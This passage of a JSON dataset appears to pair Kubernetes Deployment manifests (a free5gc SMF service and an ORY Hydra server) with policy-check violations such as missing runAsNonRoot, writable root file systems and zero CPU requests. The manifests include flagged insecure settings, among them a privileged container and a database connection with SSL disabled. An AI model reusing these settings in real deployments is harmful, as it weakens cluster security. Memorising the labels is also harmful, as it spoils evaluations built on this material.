    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smf-deployment\n  namespace: MY_NAMESPACE\n  labels:\n    app: smf\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: smf\n  template:\n    metadata:\n      labels:\n        app: smf\n      annotations:\n        cni.projectcalico.org/ipAddrs: '[\"SMF_ADDR\"]'\n    spec:\n      containers:\n      - name: smf-container\n        image: sufuf3/nextepc-build:latest\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - /usr/src/free5gc/free5gc-smfd\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: DB_URI\n          value: mongodb://mongo-external.MY_NAMESPACE.svc.cluster.local/nextepc\n        volumeMounts:\n        - name: config-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/free5gc.conf\n          subPath: free5gc.conf\n        - name: freediameter-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/freeDiameter/smf.conf\n          subPath: smf.conf\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n      securityContext:\n        sysctls:\n        - name: net.ipv6.conf.all.disable_ipv6\n          value: '0'\n      volumes:\n      - name: config-volume\n        configMap:\n          name: free5gc-config\n          items:\n          - key: config.file\n            path: free5gc.conf\n      - name: freediameter-volume\n        configMap:\n          name: freediameter-smf-config\n          items:\n          - key: config.file\n            path: smf.conf\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"smf-container\" has cpu request 0"
  },
  {
    "id": "11612",
    "manifest_path": "data/manifests/the_stack_sample/sample_4477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: smf-deployment\n  namespace: MY_NAMESPACE\n  labels:\n    app: smf\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: smf\n  template:\n    metadata:\n      labels:\n        app: smf\n      annotations:\n        cni.projectcalico.org/ipAddrs: '[\"SMF_ADDR\"]'\n    spec:\n      containers:\n      - name: smf-container\n        image: sufuf3/nextepc-build:latest\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - /usr/src/free5gc/free5gc-smfd\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: DB_URI\n          value: mongodb://mongo-external.MY_NAMESPACE.svc.cluster.local/nextepc\n        volumeMounts:\n        - name: config-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/free5gc.conf\n          subPath: free5gc.conf\n        - name: freediameter-volume\n          mountPath: /usr/src/free5gc/install/etc/free5gc/freeDiameter/smf.conf\n          subPath: smf.conf\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_TIME\n      securityContext:\n        sysctls:\n        - name: net.ipv6.conf.all.disable_ipv6\n          value: '0'\n      volumes:\n      - name: config-volume\n        configMap:\n          name: free5gc-config\n          items:\n          - key: config.file\n            path: free5gc.conf\n      - name: freediameter-volume\n        configMap:\n          name: freediameter-smf-config\n          items:\n          - key: config.file\n            path: smf.conf\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"smf-container\" has memory limit 0"
  },
  {
    "id": "11613",
    "manifest_path": "data/manifests/the_stack_sample/sample_4478.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hydra\n  labels:\n    name: hydra\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: hydra\n  template:\n    metadata:\n      labels:\n        name: hydra\n    spec:\n      initContainers:\n      - name: migrate\n        args:\n        - migrate\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - sql\n        - -e\n        - --yes\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: HYDRA_DATABASE\n          value: hydra\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        image: oryd/hydra:v1.9.2-sqlite\n        volumeMounts:\n        - mountPath: /etc/config/hydra\n          name: config\n      containers:\n      - name: server\n        image: oryd/hydra:v1.9.2-sqlite\n        args:\n        - serve\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - all\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        - name: SERVE_TLS_CERT_PATH\n          value: /certs/server.crt\n        - name: SERVE_TLS_KEY_PATH\n          value: /certs/server.key\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_OAUTH_DOMAIN\n          value: $(PL_WORK_DOMAIN)/oauth\n        - name: HYDRA_URL\n          value: https://$(PL_OAUTH_DOMAIN)/hydra\n        - name: URLS_CONSENT\n          value: https://$(PL_OAUTH_DOMAIN)/auth/hydra/consent\n        - name: URLS_LOGIN\n          value: https://$(PL_WORK_DOMAIN)/api/auth/oauth/login\n        - name: URLS_LOGOUT\n          value: https://$(PL_OAUTH_DOMAIN)/logout\n        - name: URLS_SELF_PUBLIC\n          value: $(HYDRA_URL)\n        - name: URLS_SELF_ISSUER\n          value: $(HYDRA_URL)\n        ports:\n        - containerPort: 4444\n        - containerPort: 4445\n        - containerPort: 5555\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config/hydra\n        - name: certs\n          mountPath: /certs\n        resources: {}\n      volumes:\n      - name: config\n        configMap:\n          name: hydra-config\n          items:\n          - key: hydra.yml\n            path: hydra.yml\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"migrate\" does not have a read-only root file system"
  },
  {
    "id": "11614",
    "manifest_path": "data/manifests/the_stack_sample/sample_4478.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hydra\n  labels:\n    name: hydra\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: hydra\n  template:\n    metadata:\n      labels:\n        name: hydra\n    spec:\n      initContainers:\n      - name: migrate\n        args:\n        - migrate\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - sql\n        - -e\n        - --yes\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: HYDRA_DATABASE\n          value: hydra\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        image: oryd/hydra:v1.9.2-sqlite\n        volumeMounts:\n        - mountPath: /etc/config/hydra\n          name: config\n      containers:\n      - name: server\n        image: oryd/hydra:v1.9.2-sqlite\n        args:\n        - serve\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - all\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        - name: SERVE_TLS_CERT_PATH\n          value: /certs/server.crt\n        - name: SERVE_TLS_KEY_PATH\n          value: /certs/server.key\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_OAUTH_DOMAIN\n          value: $(PL_WORK_DOMAIN)/oauth\n        - name: HYDRA_URL\n          value: https://$(PL_OAUTH_DOMAIN)/hydra\n        - name: URLS_CONSENT\n          value: https://$(PL_OAUTH_DOMAIN)/auth/hydra/consent\n        - name: URLS_LOGIN\n          value: https://$(PL_WORK_DOMAIN)/api/auth/oauth/login\n        - name: URLS_LOGOUT\n          value: https://$(PL_OAUTH_DOMAIN)/logout\n        - name: URLS_SELF_PUBLIC\n          value: $(HYDRA_URL)\n        - name: URLS_SELF_ISSUER\n          value: $(HYDRA_URL)\n        ports:\n        - containerPort: 4444\n        - containerPort: 4445\n        - containerPort: 5555\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config/hydra\n        - name: certs\n          mountPath: /certs\n        resources: {}\n      volumes:\n      - name: config\n        configMap:\n          name: hydra-config\n          items:\n          - key: hydra.yml\n            path: hydra.yml\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "11615",
    "manifest_path": "data/manifests/the_stack_sample/sample_4478.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hydra\n  labels:\n    name: hydra\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: hydra\n  template:\n    metadata:\n      labels:\n        name: hydra\n    spec:\n      initContainers:\n      - name: migrate\n        args:\n        - migrate\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - sql\n        - -e\n        - --yes\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: HYDRA_DATABASE\n          value: hydra\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        image: oryd/hydra:v1.9.2-sqlite\n        volumeMounts:\n        - mountPath: /etc/config/hydra\n          name: config\n      containers:\n      - name: server\n        image: oryd/hydra:v1.9.2-sqlite\n        args:\n        - serve\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - all\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        - name: SERVE_TLS_CERT_PATH\n          value: /certs/server.crt\n        - name: SERVE_TLS_KEY_PATH\n          value: /certs/server.key\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_OAUTH_DOMAIN\n          value: $(PL_WORK_DOMAIN)/oauth\n        - name: HYDRA_URL\n          value: https://$(PL_OAUTH_DOMAIN)/hydra\n        - name: URLS_CONSENT\n          value: https://$(PL_OAUTH_DOMAIN)/auth/hydra/consent\n        - name: URLS_LOGIN\n          value: https://$(PL_WORK_DOMAIN)/api/auth/oauth/login\n        - name: URLS_LOGOUT\n          value: https://$(PL_OAUTH_DOMAIN)/logout\n        - name: URLS_SELF_PUBLIC\n          value: $(HYDRA_URL)\n        - name: URLS_SELF_ISSUER\n          value: $(HYDRA_URL)\n        ports:\n        - containerPort: 4444\n        - containerPort: 4445\n        - containerPort: 5555\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config/hydra\n        - name: certs\n          mountPath: /certs\n        resources: {}\n      volumes:\n      - name: config\n        configMap:\n          name: hydra-config\n          items:\n          - key: hydra.yml\n            path: hydra.yml\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"migrate\" is not set to runAsNonRoot"
  },
  {
    "id": "11616",
    "manifest_path": "data/manifests/the_stack_sample/sample_4478.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hydra\n  labels:\n    name: hydra\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: hydra\n  template:\n    metadata:\n      labels:\n        name: hydra\n    spec:\n      initContainers:\n      - name: migrate\n        args:\n        - migrate\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - sql\n        - -e\n        - --yes\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: HYDRA_DATABASE\n          value: hydra\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        image: oryd/hydra:v1.9.2-sqlite\n        volumeMounts:\n        - mountPath: /etc/config/hydra\n          name: config\n      containers:\n      - name: server\n        image: oryd/hydra:v1.9.2-sqlite\n        args:\n        - serve\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - all\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        - name: SERVE_TLS_CERT_PATH\n          value: /certs/server.crt\n        - name: SERVE_TLS_KEY_PATH\n          value: /certs/server.key\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_OAUTH_DOMAIN\n          value: $(PL_WORK_DOMAIN)/oauth\n        - name: HYDRA_URL\n          value: https://$(PL_OAUTH_DOMAIN)/hydra\n        - name: URLS_CONSENT\n          value: https://$(PL_OAUTH_DOMAIN)/auth/hydra/consent\n        - name: URLS_LOGIN\n          value: https://$(PL_WORK_DOMAIN)/api/auth/oauth/login\n        - name: URLS_LOGOUT\n          value: https://$(PL_OAUTH_DOMAIN)/logout\n        - name: URLS_SELF_PUBLIC\n          value: $(HYDRA_URL)\n        - name: URLS_SELF_ISSUER\n          value: $(HYDRA_URL)\n        ports:\n        - containerPort: 4444\n        - containerPort: 4445\n        - containerPort: 5555\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config/hydra\n        - name: certs\n          mountPath: /certs\n        resources: {}\n      volumes:\n      - name: config\n        configMap:\n          name: hydra-config\n          items:\n          - key: hydra.yml\n            path: hydra.yml\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "11617",
    "manifest_path": "data/manifests/the_stack_sample/sample_4478.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hydra\n  labels:\n    name: hydra\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: hydra\n  template:\n    metadata:\n      labels:\n        name: hydra\n    spec:\n      initContainers:\n      - name: migrate\n        args:\n        - migrate\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - sql\n        - -e\n        - --yes\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: HYDRA_DATABASE\n          value: hydra\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        image: oryd/hydra:v1.9.2-sqlite\n        volumeMounts:\n        - mountPath: /etc/config/hydra\n          name: config\n      containers:\n      - name: server\n        image: oryd/hydra:v1.9.2-sqlite\n        args:\n        - serve\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - all\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        - name: SERVE_TLS_CERT_PATH\n          value: /certs/server.crt\n        - name: SERVE_TLS_KEY_PATH\n          value: /certs/server.key\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_OAUTH_DOMAIN\n          value: $(PL_WORK_DOMAIN)/oauth\n        - name: HYDRA_URL\n          value: https://$(PL_OAUTH_DOMAIN)/hydra\n        - name: URLS_CONSENT\n          value: https://$(PL_OAUTH_DOMAIN)/auth/hydra/consent\n        - name: URLS_LOGIN\n          value: https://$(PL_WORK_DOMAIN)/api/auth/oauth/login\n        - name: URLS_LOGOUT\n          value: https://$(PL_OAUTH_DOMAIN)/logout\n        - name: URLS_SELF_PUBLIC\n          value: $(HYDRA_URL)\n        - name: URLS_SELF_ISSUER\n          value: $(HYDRA_URL)\n        ports:\n        - containerPort: 4444\n        - containerPort: 4445\n        - containerPort: 5555\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config/hydra\n        - name: certs\n          mountPath: /certs\n        resources: {}\n      volumes:\n      - name: config\n        configMap:\n          name: hydra-config\n          items:\n          - key: hydra.yml\n            path: hydra.yml\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"migrate\" has cpu request 0"
  },
  {
    "id": "11618",
    "manifest_path": "data/manifests/the_stack_sample/sample_4478.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hydra\n  labels:\n    name: hydra\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: hydra\n  template:\n    metadata:\n      labels:\n        name: hydra\n    spec:\n      initContainers:\n      - name: migrate\n        args:\n        - migrate\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - sql\n        - -e\n        - --yes\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: HYDRA_DATABASE\n          value: hydra\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        image: oryd/hydra:v1.9.2-sqlite\n        volumeMounts:\n        - mountPath: /etc/config/hydra\n          name: config\n      containers:\n      - name: server\n        image: oryd/hydra:v1.9.2-sqlite\n        args:\n        - serve\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - all\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        - name: SERVE_TLS_CERT_PATH\n          value: /certs/server.crt\n        - name: SERVE_TLS_KEY_PATH\n          value: /certs/server.key\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_OAUTH_DOMAIN\n          value: $(PL_WORK_DOMAIN)/oauth\n        - name: HYDRA_URL\n          value: https://$(PL_OAUTH_DOMAIN)/hydra\n        - name: URLS_CONSENT\n          value: https://$(PL_OAUTH_DOMAIN)/auth/hydra/consent\n        - name: URLS_LOGIN\n          value: https://$(PL_WORK_DOMAIN)/api/auth/oauth/login\n        - name: URLS_LOGOUT\n          value: https://$(PL_OAUTH_DOMAIN)/logout\n        - name: URLS_SELF_PUBLIC\n          value: $(HYDRA_URL)\n        - name: URLS_SELF_ISSUER\n          value: $(HYDRA_URL)\n        ports:\n        - containerPort: 4444\n        - containerPort: 4445\n        - containerPort: 5555\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config/hydra\n        - name: certs\n          mountPath: /certs\n        resources: {}\n      volumes:\n      - name: config\n        configMap:\n          name: hydra-config\n          items:\n          - key: hydra.yml\n            path: hydra.yml\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "11619",
    "manifest_path": "data/manifests/the_stack_sample/sample_4478.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hydra\n  labels:\n    name: hydra\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: hydra\n  template:\n    metadata:\n      labels:\n        name: hydra\n    spec:\n      initContainers:\n      - name: migrate\n        args:\n        - migrate\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - sql\n        - -e\n        - --yes\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: HYDRA_DATABASE\n          value: hydra\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        image: oryd/hydra:v1.9.2-sqlite\n        volumeMounts:\n        - mountPath: /etc/config/hydra\n          name: config\n      containers:\n      - name: server\n        image: oryd/hydra:v1.9.2-sqlite\n        args:\n        - serve\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - 